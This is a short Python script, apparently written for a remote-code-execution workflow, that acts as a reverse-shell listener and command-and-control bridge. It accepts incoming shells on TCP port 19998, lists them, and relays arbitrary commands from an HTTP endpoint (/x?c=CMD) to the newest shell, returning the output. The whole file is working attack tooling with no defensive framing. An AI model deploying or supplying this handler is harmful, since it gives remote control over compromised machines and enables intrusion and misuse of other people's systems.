#!/usr/bin/env python3
# 宿主桥: TCP 0.0.0.0:19998 收反弹shell | HTTP 0.0.0.0:8990 供 shell 工具注册审计
import socket, threading, time, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

shells = []          # (conn, addr)
lock = threading.Lock()
LOG = '/workspace/ws-muvckduq-9mm9/rce/bridge.log'

def log(m):
    with open(LOG,'a') as f: f.write(time.strftime('%H:%M:%S ')+m+'\n')

def handle(conn, addr):
    conn.settimeout(1200)
    with lock: shells.append((conn, addr))
    log(f'SHELL+ {addr[0]}:{addr[1]} total={len(shells)}')
    try:
        while True:
            d = conn.recv(4096)
            if not d: break
    except Exception: pass
    with lock:
        global shells
        shells = [(c,a) for c,a in shells if c is not conn]
    log(f'SHELL- {addr[0]} total={len(shells)}')
    conn.close()

def tcp_server():
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.bind(('0.0.0.0',19998)); s.listen(8)
    log('TCP up 0.0.0.0:19998')
    while True:
        c,a = s.accept()
        threading.Thread(target=handle,args=(c,a),daemon=True).start()

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(u.query)
        if u.path == '/list':
            with lock: body = '\n'.join(f'{i}: {a[0]}:{a[1]}' for i,(c,a) in enumerate(shells)) or 'no shells'
        elif u.path == '/x' and 'c' in q:
            cmd = q['c'][0]
            with lock: conns = [c for c,a in shells]
            if not conns:
                body = 'ERR: no active shell'
            else:
                conn = conns[-1]
                try:
                    conn.sendall(b'\x00'+cmd.encode()+b'\n')
                    buf=b''; t0=time.time()
                    while time.time()-t0 < 25:
                        try:
                            d = conn.recv(65536)
                        except socket.timeout:
                            break
                        if not d: break
                        buf += d
                        if b'<<<EOR>>>' in buf.split(b'<<<EOR>>>')[-1] or buf.rstrip().endswith(b'<<<EOR>>>'):
                            break
                        time.sleep(0.15)
                    body = buf.decode('utf-8','replace')
                except Exception as e:
                    body = f'ERR: {e}'
            log(f'EXEC {cmd[:60]} -> {len(body)}B')
        else:
            body = 'usage: /x?c=CMD | /list'
        self.send_response(200)
        self.send_header('Content-Type','text/plain; charset=utf-8')
        self.end_headers()
        self.wfile.write(body.encode())
    def log_message(self,*a): pass

threading.Thread(target=tcp_server,daemon=True).start()
srv = ThreadingHTTPServer(('0.0.0.0',8990), H)
log('HTTP up 0.0.0.0:8990')
srv.serve_forever()
